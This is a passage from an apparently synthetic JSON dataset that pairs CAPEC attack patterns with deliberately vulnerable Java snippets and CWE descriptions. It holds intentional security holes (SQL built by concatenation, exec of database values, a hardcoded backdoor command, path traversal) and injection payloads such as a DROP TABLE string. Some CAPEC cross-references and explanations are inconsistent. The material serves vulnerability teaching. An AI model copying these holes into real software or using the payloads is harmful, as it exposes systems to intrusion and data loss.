        "code_snippet": "import java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.ResultSet;\nimport java.sql.Statement;\n\npublic class VulnerableSQLInjection {\n    public static void main(String[] args) {\n        String userInput = \"'; DROP TABLE users; --\"; // Malicious input\n        String query = \"SELECT * FROM users WHERE username = '\" + userInput + \"'\";\n\n        try {\n            Connection conn = DriverManager.getConnection(\"jdbc:mysql://localhost:3306/mydb\", \"user\", \"password\");\n            Statement stmt = conn.createStatement();\n            ResultSet rs = stmt.executeQuery(query);\n\n            while (rs.next()) {\n                String command = rs.getString(\"command\");\n                Runtime.getRuntime().exec(command); // Vulnerable to OS Command Injection\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability where an attacker can inject SQL commands through user input, leading to SQL Injection (CWE-89). The injected SQL command can manipulate the database query, potentially leading to data loss or corruption. Additionally, the code fetches data from the database and uses it as an argument for OS command execution without proper validation, leading to OS Command Injection (CWE-78). This represents the CAPEC scenario where malicious data injected into the database is later used to execute harmful commands on the host system."
    },
    {
        "capec_id": "109",
        "capec_name": "Object Relational Mapping Injection",
        "code_snippet": "import org.hibernate.Session;\nimport org.hibernate.query.Query;\n\npublic class ORMInjectionExample {\n    public void getUserData(Session session, String userId) {\n        // Vulnerable code: directly using user input in HQL query\n        String hql = \"FROM User WHERE id = '\" + userId + \"'\";\n        Query query = session.createQuery(hql);\n        User user = (User) query.uniqueResult();\n        System.out.println(user);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability related to Object Relational Mapping (ORM) Injection using Hibernate. The method `getUserData` takes a Hibernate `Session` and a `userId` as input. It constructs an HQL (Hibernate Query Language) query by directly concatenating the `userId` into the query string. This approach is vulnerable to SQL injection because an attacker can manipulate the `userId` input to alter the query's logic or execute arbitrary SQL commands. This example embodies the main idea of CAPEC-20, CAPEC-89, CAPEC-564, CAPEC-943, and CAPEC-1083 by showing improper input validation and improper neutralization of special elements in the data query logic."
    },
    {
        "capec_id": "110",
        "capec_name": "SQL Injection through SOAP Parameter Tampering",
        "code_snippet": "import javax.xml.soap.*;\nimport java.sql.*;\n\npublic class SOAPSQLInjectionExample {\n    public static void main(String[] args) throws Exception {\n        // Simulate receiving a SOAP message\n        String soapMessage = \"<soap:Envelope xmlns:soap=\\\"http://schemas.xmlsoap.org/soap/envelope/\\\"><soap:Body><getUser><username>admin' OR '1'='1</username></getUser></soap:Body></soap:Envelope>\";\n\n        // Parse the SOAP message\n        SOAPMessage message = MessageFactory.newInstance().createMessage(null, new java.io.ByteArrayInputStream(soapMessage.getBytes()));\n        SOAPBody body = message.getSOAPBody();\n        String username = body.getElementsByTagName(\"username\").item(0).getTextContent();\n\n        // Vulnerable SQL query construction\n        String query = \"SELECT * FROM users WHERE username = '\" + username + \"'\";\n\n        // Database connection setup\n        Connection conn = DriverManager.getConnection(\"jdbc:mysql://localhost:3306/mydatabase\", \"user\", \"password\");\n        Statement stmt = conn.createStatement();\n\n        // Execute the query\n        ResultSet rs = stmt.executeQuery(query);\n\n        // Process the result set\n        while (rs.next()) {\n            System.out.println(\"User: \" + rs.getString(\"username\"));\n        }\n\n        // Close resources\n        rs.close();\n        stmt.close();\n        conn.close();\n    }\n}",
        "description": "This Java code snippet demonstrates a SQL Injection vulnerability through SOAP parameter tampering. The code simulates receiving a SOAP message containing a username parameter. The SOAP message is parsed to extract the username, which is then used directly in an SQL query without proper validation or parameter binding. This allows an attacker to inject malicious SQL code through the username parameter, potentially gaining unauthorized access to the database. The code highlights the importance of proper input validation and the use of parameterized queries to prevent SQL Injection attacks."
    },
    {
        "capec_id": "111",
        "capec_name": "JSON Hijacking (aka JavaScript Hijacking)",
        "code_snippet": "import javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.IOException;\nimport java.io.PrintWriter;\n\npublic class VulnerableJSONServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        response.setContentType(\"application/json\");\n        PrintWriter out = response.getWriter();\n\n        // Simulated sensitive data\n        String sensitiveData = \"{\\\"user\\\": \\\"admin\\\", \\\"token\\\": \\\"12345\\\"}\";\n\n        // No origin validation\n        out.print(sensitiveData);\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerability to JSON Hijacking. The servlet responds to GET requests by sending a JSON object containing sensitive data without performing any origin validation. This lack of validation (CWE-346) allows an attacker to include and execute this JSON data in the context of another website, exploiting the browser's Same Origin Policy loophole. The code also does not verify the authenticity of the request (CWE-345), making it susceptible to Cross-Site Request Forgery (CWE-352). Additionally, the servlet does not neutralize user input (CWE-79) and relies on client-side enforcement of security (CWE-602), further exacerbating the vulnerability."
    },
    {
        "capec_id": "112",
        "capec_name": "Brute Force",
        "code_snippet": "import java.util.Random;\n\npublic class WeakAuthentication {\n    private static final int MAX_ATTEMPTS = 1000;\n    private static final String SECRET = \"password123\";\n    private static final Random random = new Random();\n\n    public static void main(String[] args) {\n        for (int i = 0; i < MAX_ATTEMPTS; i++) {\n            String attempt = generateRandomPassword();\n            if (authenticate(attempt)) {\n                System.out.println(\"Access granted with password: \" + attempt);\n                return;\n            }\n        }\n        System.out.println(\"Access denied after \" + MAX_ATTEMPTS + \" attempts.\");\n    }\n\n    private static boolean authenticate(String password) {\n        return SECRET.equals(password);\n    }\n\n    private static String generateRandomPassword() {\n        int length = 10;\n        StringBuilder password = new StringBuilder(length);\n        for (int i = 0; i < length; i++) {\n            password.append((char) (random.nextInt(26) + 'a'));\n        }\n        return password.toString();\n    }\n}",
        "description": "This Java code snippet demonstrates a weak authentication mechanism vulnerable to brute force attacks. The `authenticate` method checks if a given password matches a hardcoded secret (`password123`). The `main` method attempts to brute force the password by generating random passwords up to a maximum number of attempts (`MAX_ATTEMPTS`). The `generateRandomPassword` method creates a random 10-character password using insufficiently random values. This code embodies the main idea of the CAPEC by showing how an attacker could use trial-and-error to guess the password, exploiting weaknesses such as insufficiently random values (CWE-330), weak password requirements (CWE-521), and improper restriction of excessive authentication attempts (CWE-307)."
    },
    {
        "capec_id": "113",
        "capec_name": "Interface Manipulation",
        "code_snippet": "import java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\n\npublic class InterfaceManipulationExample {\n    private static final String DEBUG_MODE_FILE = \"/sys/hardware/debug_mode\";\n    private static final String REGISTER_FILE = \"/sys/hardware/register\";\n\n    public static void main(String[] args) {\n        try {\n            // Improper Access Control for Register Interface (CWE-1262)\n            String registerValue = new String(Files.readAllBytes(Paths.get(REGISTER_FILE)));\n            System.out.println(\"Register Value: \" + registerValue);\n\n            // Exposed IOCTL with Insufficient Access Control (CWE-782)\n            if (args.length > 0 && args[0].equals(\"enable_debug\")) {\n                enableDebugMode();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void enableDebugMode() throws IOException {\n        // Hardware Allows Activation of Test or Debug Logic at Runtime (CWE-1313)\n        Files.write(Paths.get(DEBUG_MODE_FILE), \"1\".getBytes());\n        System.out.println(\"Debug mode enabled.\");\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an adversary can manipulate hardware interfaces due to improper access control and insufficient protections. The code reads a value from a hardware register file, which represents CWE-1262 (Improper Access Control for Register Interface). It also includes a method to enable debug mode by writing to a debug mode file, representing CWE-1313 (Hardware Allows Activation of Test or Debug Logic at Runtime). The main method checks for a command-line argument to enable debug mode, illustrating CWE-782 (Exposed IOCTL with Insufficient Access Control). This code embodies the main idea of CAPEC-225 (Interface Manipulation) by showing how an adversary can manipulate hardware interfaces to bypass access controls and execute unintended functionality."
    },
    {
        "capec_id": "114",
        "capec_name": "Authentication Abuse",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class AuthenticationAbuseExample {\n    private static Map<String, String> users = new HashMap<>();\n    private static int failedAttempts = 0;\n    private static final int MAX_ATTEMPTS = 5;\n\n    static {\n        // Adding a user with username 'admin' and password 'password'\n        users.put(\"admin\", \"password\");\n    }\n\n    public static boolean authenticate(String username, String password) {\n        if (failedAttempts >= MAX_ATTEMPTS) {\n            System.out.println(\"Account locked due to too many failed attempts.\");\n            return false;\n        }\n\n        if (users.containsKey(username) && users.get(username).equals(password)) {\n            System.out.println(\"Authentication successful.\");\n            failedAttempts = 0; // Reset failed attempts on successful login\n            return true;\n        } else {\n            failedAttempts++;\n            System.out.println(\"Authentication failed.\");\n            return false;\n        }\n    }\n\n    public static void main(String[] args) {\n        // Simulating authentication attempts\n        authenticate(\"admin\", \"wrongpassword\"); // Failed attempt 1\n        authenticate(\"admin\", \"wrongpassword\"); // Failed attempt 2\n        authenticate(\"admin\", \"wrongpassword\"); // Failed attempt 3\n        authenticate(\"admin\", \"wrongpassword\"); // Failed attempt 4\n        authenticate(\"admin\", \"wrongpassword\"); // Failed attempt 5\n        authenticate(\"admin\", \"password\"); // Account locked, even with correct password\n    }\n}",
        "description": "This Java code snippet demonstrates an authentication mechanism that is vulnerable to abuse, embodying the main idea of CAPEC-Authentication Abuse. The code includes a simple authentication system with a hardcoded user and password. It also implements a basic mechanism to lock the account after a certain number of failed attempts (CWE-307). However, the code is vulnerable because it does not provide a secure way to handle authentication (CWE-287, CWE-1390) and can be easily bypassed if an attacker knows the correct sequence of events. The code also does not handle the exposure of internal assets securely (CWE-1244). The main idea represented here is that even though an authentication mechanism is in place, it can be abused due to inherent weaknesses or flaws in its implementation."
    },
    {
        "capec_id": "115",
        "capec_name": "Authentication Bypass",
        "code_snippet": "import java.util.Scanner;\n\npublic class AuthBypassExample {\n    private static boolean isAuthenticated = false;\n\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.print(\"Enter password: \");\n        String password = scanner.nextLine();\n\n        // Weak authentication mechanism\n        if (password.equals(\"password123\")) {\n            isAuthenticated = true;\n        }\n\n        // Authentication bypass using an alternate path\n        System.out.print(\"Enter admin command: \");\n        String command = scanner.nextLine();\n\n        if (command.equals(\"adminAccess\")) {\n            System.out.println(\"Admin access granted without authentication!\");\n        } else if (isAuthenticated) {\n            System.out.println(\"Access granted.\");\n        } else {\n            System.out.println(\"Access denied.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates an authentication bypass vulnerability. The code first asks the user to enter a password and checks it against a hardcoded weak password ('password123'). If the password matches, the user is marked as authenticated. However, the code also includes an alternate path for authentication bypass: if the user enters the command 'adminAccess', they are granted admin access without any authentication check. This represents CWE-288 (Authentication Bypass Using an Alternate Path or Channel) and CWE-1390 (Weak Authentication). The code highlights how an attacker can gain unauthorized access by exploiting weak authentication mechanisms and alternate paths that do not require proper authentication."
    },
    {
        "capec_id": "116",
        "capec_name": "Excavation",
        "code_snippet": "import java.io.*;\nimport java.nio.file.*;\n\npublic class SensitiveInfoExposure {\n    public static void main(String[] args) {\n        try {\n            // CWE-426: Untrusted Search Path\n            String filePath = args[0];\n            File file = new File(filePath);\n            \n            // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n            if (file.exists() && file.isFile()) {\n                String sensitiveData = new String(Files.readAllBytes(file.toPath()));\n                System.out.println(\"Sensitive Data: \" + sensitiveData);\n            } else {\n                System.out.println(\"File not found or is not a file.\");\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where sensitive information can be exposed to an unauthorized actor (CWE-200) by reading and printing the contents of a file specified by an external input (CWE-426: Untrusted Search Path). The code takes a file path as an argument, reads the file's contents, and prints it to the console. This can be exploited by an adversary to probe the system for sensitive information, aligning with the CAPEC concept of 'Excavation'."
    },
    {
        "capec_id": "117",
        "capec_name": "Interception",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.net.Socket;\n\npublic class CleartextTransmission {\n    public static void main(String[] args) {\n        String serverAddress = \"example.com\";\n        int port = 80;\n        try (Socket socket = new Socket(serverAddress, port);\n             OutputStream out = socket.getOutputStream();\n             BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()))) {\n\n            // Sending sensitive information in cleartext\n            String sensitiveData = \"username=admin&password=admin123\";\n            out.write((\"POST /login HTTP/1.1\\r\\n\" +\n                       \"Host: \" + serverAddress + \"\\r\\n\" +\n                       \"Content-Length: \" + sensitiveData.length() + \"\\r\\n\" +\n                       \"Content-Type: application/x-www-form-urlencoded\\r\\n\\r\\n\" +\n                       sensitiveData).getBytes());\n            out.flush();\n\n            // Reading the response\n            String responseLine;\n            while ((responseLine = in.readLine()) != null) {\n                System.out.println(responseLine);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the transmission of sensitive information (username and password) in cleartext over an HTTP connection. The code establishes a socket connection to a server and sends a POST request containing sensitive data without any encryption. This embodies the main idea of CAPEC-157 (Interception) and CWE-319 (Cleartext Transmission of Sensitive Information). An adversary could easily intercept this data stream and read the sensitive information, as it is not encrypted. This example highlights the vulnerability of transmitting sensitive data in cleartext, making it susceptible to interception attacks."
    },
    {
        "capec_id": "120",
        "capec_name": "Double Encoding",
        "code_snippet": "import java.net.URLDecoder;\nimport java.nio.charset.StandardCharsets;\n\npublic class DoubleEncodingExample {\n    public static void main(String[] args) {\n        String input = \"%252E%252E%252F%252E%252E%252Fetc%252Fpasswd\"; // Double encoded payload\n        String decodedOnce = URLDecoder.decode(input, StandardCharsets.UTF_8);\n        String decodedTwice = URLDecoder.decode(decodedOnce, StandardCharsets.UTF_8);\n\n        // Improper handling of double encoding\n        if (decodedTwice.contains(\"../\")) {\n            System.out.println(\"Potential Path Traversal Attack detected!\");\n        } else {\n            System.out.println(\"Input is safe.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of double encoding, where an input string is encoded twice to bypass security filters. The input string \"%252E%252E%252F%252E%252E%252Fetc%252Fpasswd\" represents a double-encoded path traversal attack payload. The code decodes the input string twice using `URLDecoder.decode` and then checks if the decoded string contains the sequence \"../\", which is indicative of a path traversal attempt. The code highlights the vulnerability where improper handling of double encoding can lead to security issues, such as path traversal attacks. This example is related to several CWEs, including improper handling of URL encoding (CWE-177), improper input validation (CWE-20), and improper neutralization of special elements (CWE-74)."
    },
    {
        "capec_id": "121",
        "capec_name": "Exploit Non-Production Interfaces",
        "code_snippet": "public class ProductionSystem {\n    private boolean debugMode = true; // CWE-489: Active Debug Code\n\n    public void processRequest(String request) {\n        if (debugMode) {\n            System.out.println(\"Debug Info: Processing request: \" + request); // CWE-1295: Debug Messages Revealing Unnecessary Information\n        }\n        // Process the request\n    }\n\n    public static void main(String[] args) {\n        ProductionSystem system = new ProductionSystem();\n        system.processRequest(\"Sample Request\");\n    }\n}",
        "description": "This Java code snippet represents a production system with an active debug mode (CWE-489). The `debugMode` flag is set to true, which should not be the case in a production environment. When processing a request, the system prints debug information, revealing potentially sensitive details (CWE-1295). This embodies the main idea of CAPEC-111: 'Exploit Non-Production Interfaces', where an adversary can exploit debug interfaces unintentionally left enabled in a production system to glean information or leverage functionality that should not be available."
    },
    {
        "capec_id": "122",
        "capec_name": "Privilege Abuse",
        "code_snippet": "public class PrivilegeAbuseExample {\n    private boolean isAdmin;\n    private String sensitiveData = \"Top Secret Data\";\n\n    public PrivilegeAbuseExample(boolean isAdmin) {\n        this.isAdmin = isAdmin;\n    }\n\n    public String getSensitiveData() {\n        if (isAdmin) {\n            return sensitiveData;\n        } else {\n            // Improper Access Control: Non-admin users should not access this data\n            return sensitiveData; // CWE-284: Improper Access Control\n        }\n    }\n\n    public void setSensitiveData(String data) {\n        if (isAdmin) {\n            sensitiveData = data;\n        } else {\n            // Improper Privilege Management: Non-admin users should not modify this data\n            sensitiveData = data; // CWE-269: Improper Privilege Management\n        }\n    }\n\n    public static void main(String[] args) {\n        PrivilegeAbuseExample user = new PrivilegeAbuseExample(false); // Non-admin user\n        System.out.println(\"Sensitive Data: \" + user.getSensitiveData());\n        user.setSensitiveData(\"New Data\");\n        System.out.println(\"Sensitive Data: \" + user.getSensitiveData());\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where privilege abuse can occur due to improper access control and privilege management. The `PrivilegeAbuseExample` class has a boolean flag `isAdmin` to indicate if a user is an admin. The `getSensitiveData` and `setSensitiveData` methods are supposed to restrict access to sensitive data based on the user's privilege level. However, due to improper access control (CWE-284) and improper privilege management (CWE-269), non-admin users can both read and modify the sensitive data. This represents the main idea of the CAPEC, where features meant for privileged users are exposed to lower-privileged users."
    },
    {
        "capec_id": "123",
        "capec_name": "Buffer Manipulation",
        "code_snippet": "public class BufferManipulationExample {\n    public static void main(String[] args) {\n        String[] data = {\"one\", \"two\", \"three\"};\n        int index = 4; // CWE-1285: Improper Validation of Specified Index\n\n        // CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer\n        if (index >= 0 && index < data.length) {\n            System.out.println(data[index]);\n        } else {\n            // CWE-127: Buffer Under-read and CWE-126: Buffer Over-read\n            System.out.println(\"Index out of bounds\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a common buffer manipulation vulnerability. The main idea is to show how improper validation of an index (CWE-1285) can lead to buffer over-read (CWE-126) or under-read (CWE-127). The code attempts to access an element in an array using an index that is out of bounds, which can result in reading unintended memory locations. The check for index bounds is included to highlight the importance of proper validation to prevent such vulnerabilities."
    },
    {
        "capec_id": "124",
        "capec_name": "Shared Resource Manipulation",
        "code_snippet": "import java.util.concurrent.locks.ReentrantLock;\n\npublic class SharedResourceManipulation {\n    private static int sharedResource = 0;\n    private static ReentrantLock lock = new ReentrantLock();\n\n    public static void main(String[] args) {\n        Thread thread1 = new Thread(() -> manipulateResource());\n        Thread thread2 = new Thread(() -> manipulateResource());\n\n        thread1.start();\n        thread2.start();\n    }\n\n    public static void manipulateResource() {\n        for (int i = 0; i < 1000; i++) {\n            if (lock.tryLock()) {\n                try {\n                    // Critical section\n                    sharedResource++;\n                    System.out.println(\"Shared Resource: \" + sharedResource);\n                } finally {\n                    lock.unlock();\n                }\n            } else {\n                // Simulate improper synchronization by accessing the resource without locking\n                sharedResource++;\n                System.out.println(\"(Unsafe) Shared Resource: \" + sharedResource);\n            }\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where a shared resource (an integer variable) is manipulated by multiple threads. The code uses a ReentrantLock to synchronize access to the shared resource. However, it also includes a branch where the resource is accessed without proper locking, simulating improper synchronization (CWE-662). This can lead to race conditions and inconsistent states of the shared resource, embodying the main idea of CAPEC-662: Shared Resource Manipulation. The code highlights the risks of improper isolation and synchronization of shared resources in a multi-threaded environment."
    },
    {
        "capec_id": "125",
        "capec_name": "Flooding",
        "code_snippet": "import java.io.IOException;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic class FloodingVulnerableServer {\n    private static final int PORT = 8080;\n\n    public static void main(String[] args) {\n        try (ServerSocket serverSocket = new ServerSocket(PORT)) {\n            while (true) {\n                Socket clientSocket = serverSocket.accept();\n                // Handle client connection in a new thread\n                new Thread(() -> handleClient(clientSocket)).start();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void handleClient(Socket clientSocket) {\n        try {\n            // Simulate handling client request\n            Thread.sleep(1000); // Simulate some processing time\n            clientSocket.close();\n        } catch (IOException | InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet represents a simple server that is vulnerable to a flooding attack. The server listens on port 8080 and spawns a new thread for each incoming client connection. The handleClient method simulates processing the client's request by sleeping for 1 second before closing the connection. This design does not impose any limits on the number of concurrent connections or the rate of incoming requests, making it susceptible to resource exhaustion. An attacker can exploit this by rapidly opening a large number of connections, consuming the server's resources and potentially causing it to crash or become unresponsive. This example embodies the main idea of the CAPEC 'Flooding' attack and highlights related CWEs such as 'Allocation of Resources Without Limits or Throttling' (CWE-770) and 'Uncontrolled Resource Consumption' (CWE-400)."
    },
    {
        "capec_id": "126",
        "capec_name": "Path Traversal",
        "code_snippet": "import java.io.*;\n\npublic class PathTraversalExample {\n    public static void main(String[] args) {\n        if (args.length != 1) {\n            System.out.println(\"Usage: java PathTraversalExample <filename>\");\n            return;\n        }\n\n        String filename = args[0];\n        String basePath = \"/var/www/uploads/\";\n        File file = new File(basePath + filename);\n\n        try (BufferedReader reader = new BufferedReader(new FileReader(file))) {\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of a path traversal vulnerability. The program takes a filename as a command-line argument and attempts to read and print the contents of the file located in the '/var/www/uploads/' directory. However, it does not properly validate or sanitize the input filename, allowing an attacker to use sequences like '../' to traverse directories and access files outside the intended directory. This embodies the main idea of the CAPEC and related CWEs, where insufficient input validation allows unauthorized access to files."
    },
    {
        "capec_id": "127",
        "capec_name": "Directory Indexing",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class DirectoryListingServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String path = request.getParameter(\"path\");\n        if (path == null) {\n            response.sendError(HttpServletResponse.SC_BAD_REQUEST, \"Path parameter is missing\");\n            return;\n        }\n        File dir = new File(path);\n        if (dir.isDirectory()) {\n            String[] files = dir.list();\n            if (files != null) {\n                response.setContentType(\"text/plain\");\n                for (String file : files) {\n                    response.getWriter().println(file);\n                }\n            } else {\n                response.sendError(HttpServletResponse.SC_INTERNAL_SERVER_ERROR, \"Unable to list directory contents\");\n            }\n        } else {\n            response.sendError(HttpServletResponse.SC_NOT_FOUND, \"Directory not found\");\n        }\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerable implementation of directory indexing. The servlet takes a 'path' parameter from the HTTP request and lists the contents of the specified directory. If the 'path' parameter points to a directory, the servlet responds with a plain text list of the directory's contents. This code is vulnerable to several issues described in the related CWEs:\n\n1. **Improper Protection of Alternate Path (CWE-424)**: The code does not validate or sanitize the 'path' parameter, allowing an attacker to access arbitrary directories.\n2. **Direct Request ('Forced Browsing') (CWE-425)**: The servlet does not enforce any authorization checks, allowing unauthorized users to access directory contents.\n3. **Incorrect Permission Assignment for Critical Resource (CWE-732)**: The code assumes that the directory contents can be safely listed without considering the permissions of the files within the directory.\n4. **Incorrect Default Permissions (CWE-276)**: The code does not check or enforce proper file permissions, potentially exposing sensitive files.\n5. **Protection Mechanism Failure (CWE-693)**: The code lacks mechanisms to prevent directory traversal attacks, where an attacker could manipulate the 'path' parameter to access restricted directories.\n\nOverall, this code snippet represents the main idea of the CAPEC by demonstrating how an adversary could exploit directory indexing to explore the directory tree and access sensitive information."
    },
    {
        "capec_id": "128",
        "capec_name": "Integer Attacks",
        "code_snippet": "public class IntegerAttackExample {\n    public static void main(String[] args) {\n        int maxValue = Integer.MAX_VALUE;\n        int result = maxValue + 1; // Integer overflow\n        System.out.println(\"Result: \" + result);\n\n        int negativeValue = -1;\n        int extendedValue = (short) negativeValue; // Unexpected sign extension\n        System.out.println(\"Extended Value: \" + extendedValue);\n\n        int value = 100;\n        if (value <= 200) { // Numeric range comparison without minimum check\n            System.out.println(\"Value is within range.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates several integer-related vulnerabilities. \n\n1. **Integer Overflow (CWE-190)**: Adding 1 to `Integer.MAX_VALUE` causes an overflow, resulting in a negative number. This can lead to unexpected behavior in applications that do not handle such cases.\n\n2. **Unexpected Sign Extension (CWE-194)**: Casting a negative integer to a short can cause unexpected sign extension, leading to incorrect values.\n\n3. **Numeric Range Comparison Without Minimum Check (CWE-839)**: The code checks if a value is less than or equal to 200 but does not verify if it is greater than or equal to a minimum value, potentially allowing invalid values to pass the check.\n\nThese examples illustrate how improper handling of integer operations can lead to vulnerabilities, as described in the CAPEC for Integer Attacks."
    },
    {
        "capec_id": "129",
        "capec_name": "Pointer Manipulation",
        "code_snippet": "public class PointerManipulationExample {\n    public static void main(String[] args) {\n        int[] array = new int[10];\n        int index = getIndexFromUntrustedSource(); // CWE-822: Untrusted Pointer Dereference\n        \n        // CWE-823: Use of Out-of-range Pointer Offset\n        if (index >= 0 && index < array.length) {\n            array[index] = 42; // Safe access\n        } else {\n            // CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer\n            // CWE-476: NULL Pointer Dereference (simulated by accessing invalid index)\n            System.out.println(\"Accessing out-of-bounds index: \" + index);\n            array[index] = 42; // Unsafe access, potential crash or data corruption\n        }\n    }\n\n    private static int getIndexFromUntrustedSource() {\n        // Simulate getting an index from an untrusted source\n        return 15; // This is an out-of-bounds index for the array\n    }\n}",
        "description": "This Java code snippet demonstrates a pointer manipulation vulnerability by accessing an array with an index obtained from an untrusted source. The `getIndexFromUntrustedSource` method simulates obtaining an index that is out-of-bounds for the array. The code checks if the index is within the valid range, but if it is not, it proceeds to access the array with the invalid index, leading to potential crashes or data corruption. This embodies the main idea of the CAPEC by showing how pointer manipulation can result in accessing unintended memory locations. The related CWEs are illustrated through the use of an untrusted index (CWE-822), out-of-range pointer offset (CWE-823), improper restriction of operations within the bounds of a memory buffer (CWE-119), and a simulated NULL pointer dereference (CWE-476)."
    },
    {
        "capec_id": "130",
        "capec_name": "Excessive Allocation",
        "code_snippet": "import java.util.ArrayList;\nimport java.util.List;\n\npublic class ExcessiveAllocationExample {\n    private List<byte[]> memoryHog = new ArrayList<>();\n\n    public void allocateExcessiveMemory(int numAllocations, int sizePerAllocation) {\n        for (int i = 0; i < numAllocations; i++) {\n            memoryHog.add(new byte[sizePerAllocation]);\n        }\n    }\n\n    public static void main(String[] args) {\n        ExcessiveAllocationExample example = new ExcessiveAllocationExample();\n        // This will allocate a large amount of memory in a single request\n        example.allocateExcessiveMemory(1, Integer.MAX_VALUE - 8);\n    }\n}",
        "description": "This Java code snippet demonstrates an excessive allocation vulnerability. The `allocateExcessiveMemory` method allows an attacker to allocate a large amount of memory with a single request by specifying a large size for the allocation. In the `main` method, the example allocates nearly the maximum possible array size in Java, which can lead to memory exhaustion. This embodies the CAPEC concept of causing the target to allocate excessive resources with a small number of requests. The related CWEs are represented as follows:\n- CWE-770: No limits are imposed on the size of the memory allocation.\n- CWE-1325: The method performs separate memory allocations without limiting the total memory consumed.\n- CWE-400: The product does not control the allocation of memory, leading to potential resource exhaustion."
    },
    {
        "capec_id": "131",
        "capec_name": "Resource Leak Exposure",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.FileReader;\nimport java.io.IOException;\n\npublic class ResourceLeakExample {\n    public static void main(String[] args) {\n        BufferedReader reader = null;\n        try {\n            reader = new BufferedReader(new FileReader(\"example.txt\"));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            // Improper resource shutdown or release\n            // Missing release of resource after effective lifetime\n            // This can lead to resource leak\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a resource leak vulnerability. The code attempts to read a file using a BufferedReader but fails to properly release the resource in the finally block. This embodies the CAPEC 'Resource Leak Exposure' by not releasing the BufferedReader resource, which can deplete the available resources for legitimate requests. The related CWEs are represented as follows: CWE-404 (Improper Resource Shutdown or Release) and CWE-772 (Missing Release of Resource after Effective Lifetime). The lack of a proper resource release mechanism can lead to resource exhaustion, making the system vulnerable to denial-of-service attacks."
    },
    {
        "capec_id": "132",
        "capec_name": "Symlink Attack",
        "code_snippet": "import java.io.*;\n\npublic class SymlinkAttackExample {\n    public static void main(String[] args) {\n        String userInput = \"/tmp/userfile\"; // This should be user-controlled input\n        File file = new File(userInput);\n\n        try {\n            // Check if the file exists\n            if (file.exists()) {\n                // Open the file for reading\n                BufferedReader reader = new BufferedReader(new FileReader(file));\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    System.out.println(line);\n                }\n                reader.close();\n            } else {\n                System.out.println(\"File does not exist.\");\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a potential symlink attack vulnerability. The code takes a user-controlled input (a file path) and attempts to read the file if it exists. The vulnerability arises because the code does not check if the file is a symbolic link that could point to an unintended or unauthorized resource. An attacker could exploit this by creating a symbolic link at the specified path that points to a sensitive file, leading to unauthorized access. This example embodies the main idea of the CAPEC by showing how improper link resolution and external control of file paths can lead to security issues."
    },
    {
        "capec_id": "133",
        "capec_name": "Try All Common Switches",
        "code_snippet": "public class Application {\n    public static void main(String[] args) {\n        for (String arg : args) {\n            switch (arg) {\n                case \"--debug\":\n                    enableDebugMode();\n                    break;\n                case \"--verbose\":\n                    enableVerboseMode();\n                    break;\n                case \"--hidden\":\n                    enableHiddenFunctionality();\n                    break;\n                default:\n                    System.out.println(\"Unknown option: \" + arg);\n            }\n        }\n    }\n\n    private static void enableDebugMode() {\n        System.out.println(\"Debug mode enabled\");\n        // Debug information that might reveal sensitive data\n    }\n\n    private static void enableVerboseMode() {\n        System.out.println(\"Verbose mode enabled\");\n        // Verbose logging\n    }\n\n    private static void enableHiddenFunctionality() {\n        System.out.println(\"Hidden functionality enabled\");\n        // Hidden functionality that should not be accessible\n    }\n}",
